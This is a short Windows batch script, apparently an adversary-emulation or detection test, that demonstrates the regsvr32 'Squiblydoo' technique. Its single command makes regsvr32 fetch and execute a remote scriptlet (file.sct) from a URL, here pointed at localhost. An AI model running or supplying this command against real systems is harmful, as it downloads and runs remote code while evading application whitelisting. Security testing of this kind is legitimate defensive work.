@ECHO OFF

ECHO ===========================================================================
ECHO REGSVR32 EXEC
ECHO Regsvr32 exection examples.
ping -n 3 127.0.0.1 > NUL

regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll
